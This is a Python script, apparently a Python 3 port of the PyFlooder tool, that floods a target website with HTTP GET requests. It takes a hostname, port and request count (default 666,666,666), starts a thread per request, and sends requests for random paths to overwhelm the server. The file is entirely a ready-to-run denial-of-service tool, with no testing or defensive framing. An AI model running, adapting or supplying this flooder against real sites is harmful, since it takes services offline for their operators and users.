# -*- coding: utf-8 -*-
# references https://github.com/D4Vinci/PyFlooder/blob/master/pyflooder.py
# Moved from python2 to python3

import random
import socket
import string
import sys
import threading
import time

## Parses command line arguments to extract host, port, and number of requests
def parse_arguments():
    # Parse arguments
    host = ""
    port = 0
    num_requests = 0
    if len(sys.argv) == 2:
        port = 80
        num_requests = 666666666
    elif len(sys.argv) == 3:
        port = int(sys.argv[2])
        num_requests = 666666666
    elif len(sys.argv) == 4:
        port = int(sys.argv[2])
        num_requests = int(sys.argv[3])
    else:
        print ("ERROR\n Usage: " + sys.argv[0] + " <HOSTNAME> <PORT> <NUM_REQUESTS>")
        sys.exit(1)

    host = sys.argv[1]
    return host, port, num_requests

## Gets ip address for host_name
def resolve_DNS(host_name):
    # Resolve FQDN to IP
    try:
        ## clean https, http, or www. and geet the ip address from socket
        host = str(host_name).replace("https://", "").replace("http://", "").replace("www.", "")
        ip = socket.gethostbyname(host)
        return host, ip
    except socket.gaierror:
        print (" ERROR\n Make sure you entered a correct website")
        sys.exit(2)


# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print ("\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] about to attack")

    thread_num_mutex.release()


# Generate the URL Path to prepare sending thee payload
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Perform the request
def attack(host, ip, port):
    print_status()
    url_path = generate_url_path()

    # Create a raw socket
    dos_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Open the connection on that raw socket
        dos_socket.connect((ip, port))

        # Send the request according to HTTP spec
        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
        request = msg.encode()
        dos_socket.send(request) ## possible spoof the packet
    except socket.error:
        print ("\n [ No connection, server may be down ]: " + str(socket.error))
    finally:
        # Close our socket gracefully
        dos_socket.shutdown(socket.SHUT_RDWR)
        dos_socket.close()


## Spawns multiple threads to attack the host
def spawn_attacks(host, ip, port, num_requests):


    # Spawn a thread per request
    all_threads = []
    for i in range(num_requests):
        t1 = threading.Thread(target=attack, args=[host, ip, port])
        t1.start()
        all_threads.append(t1)

        # Adjusting this sleep time will affect requests per second
        time.sleep(0.01)

    for current_thread in all_threads:
        current_thread.join()  # Make the main thread wait for the children threads



def main():
    # Parse arguments
    host_name, port, num_requests = parse_arguments()

    host, ip = resolve_DNS(host_name)

    print("Attack starting on {host} ({ip}) | Port: {port} | Requests: {limit}".format(host=host, ip=ip, port=port, limit=num_requests))

    ## Spawn multiple threads to attack the host
    spawn_attacks(host, ip, port, num_requests)

# Create a shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()
main()
